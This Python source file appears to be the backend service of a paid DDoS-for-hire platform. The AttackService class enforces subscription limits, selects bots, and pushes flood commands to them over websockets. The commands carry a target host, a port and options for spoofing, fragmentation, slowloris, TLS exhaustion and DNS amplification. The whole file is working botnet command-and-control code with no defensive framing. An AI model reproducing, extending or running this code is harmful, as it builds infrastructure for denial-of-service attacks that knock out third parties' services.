from datetime import datetime, timezone, timedelta
from typing import Optional, List
from uuid import UUID
from sqlalchemy import select, and_
from app.database import async_session
from app.models.all_models import AttackTask, Bot, User, Plan, UserSubscription
from app.schemas.all_schemas import AttackCreate
from app.services.bot_service import BotService
from app.websocket.bot_handler import manager

class AttackService:
    @staticmethod
    async def launch(user: User, data: AttackCreate) -> AttackTask:
        async with async_session() as s:
            sub_r = await s.execute(select(UserSubscription).where(and_(UserSubscription.user_id == user.id, UserSubscription.status == "active")))
            sub = sub_r.scalar_one_or_none()
            if not sub: raise ValueError("No active subscription. Buy a plan first.")

            plan_r = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
            plan = plan_r.scalar_one_or_none()
            if not plan: raise ValueError("Plan not found")

            if data.duration_secs > plan.max_attack_secs: raise ValueError(f"Duration exceeds plan limit ({plan.max_attack_secs}s)")
            if data.pps_per_bot > plan.max_pps_per_bot: raise ValueError(f"PPS exceeds plan limit ({plan.max_pps_per_bot})")
            if data.method not in plan.allowed_methods: raise ValueError(f"Method '{data.method}' not allowed in plan")

            recent = (await s.execute(select(AttackTask).where(AttackTask.user_id == user.id).order_by(AttackTask.created_at.desc()).limit(1))).scalar_one_or_none()
            if recent and recent.completed_at:
                cd_end = recent.completed_at + timedelta(seconds=plan.cooldown_secs)
                if cd_end > datetime.now(timezone.utc): raise ValueError(f"Cooldown: {int((cd_end-datetime.now(timezone.utc)).total_seconds())}s")

            available = await BotService.get_available_bots(plan.max_concurrent, [data.method])
            if not available: raise ValueError("No bots available.")

            bot_ids = [b.id for b in available]
            task = AttackTask(
                user_id=user.id, target_host=data.target_host, target_port=data.target_port,
                method=data.method, duration_secs=data.duration_secs, pps_per_bot=data.pps_per_bot,
                spoof_mode=data.spoof_mode, fragmentation=data.fragmentation,
                slowloris=data.slowloris, tls_exhaust=data.tls_exhaust,
                dns_amp=data.dns_amp, game_mimic=data.game_mimic,
                mega_mode=data.mega_mode,
                status="running", bot_ids=bot_ids, started_at=datetime.now(timezone.utc),
            )
            s.add(task); await s.commit(); await s.refresh(task)

            for bot in available:
                await manager.send_attack_command(str(bot.id), {
                    "id": str(task.id), "target": data.target_host, "port": data.target_port,
                    "method": data.method, "duration": data.duration_secs,
                    "pps": data.pps_per_bot, "threads": bot.max_threads,
                    "spoof_mode": data.spoof_mode, "fragmentation": int(data.fragmentation),
                    "slowloris": int(data.slowloris), "tls_exhaust": int(data.tls_exhaust),
                    "dns_amp": int(data.dns_amp), "game_mimic": int(data.game_mimic),
                    "mega_mode": int(data.mega_mode),
                })
            return task

    @staticmethod
    async def stop(task_id: UUID, user_id: UUID):
        async with async_session() as s:
            task = (await s.execute(select(AttackTask).where(AttackTask.id == task_id, AttackTask.status == "running"))).scalar_one_or_none()
            if not task: raise ValueError("Task not running")
            task.status = "completed"; task.completed_at = datetime.now(timezone.utc); await s.commit()
            for bid in task.bot_ids: await manager.send_stop_command(str(bid), str(task_id))

    @staticmethod
    async def get_user_tasks(user_id: UUID) -> List[AttackTask]:
        async with async_session() as s:
            r = await s.execute(select(AttackTask).where(AttackTask.user_id == user_id).order_by(AttackTask.created_at.desc()).limit(100))
            return list(r.scalars().all())

    @staticmethod
    async def get_active_tasks(user_id: Optional[UUID] = None) -> List[AttackTask]:
        async with async_session() as s:
            conds = [AttackTask.status == "running"]
            if user_id: conds.append(AttackTask.user_id == user_id)
            r = await s.execute(select(AttackTask).where(and_(*conds)))
            return list(r.scalars().all())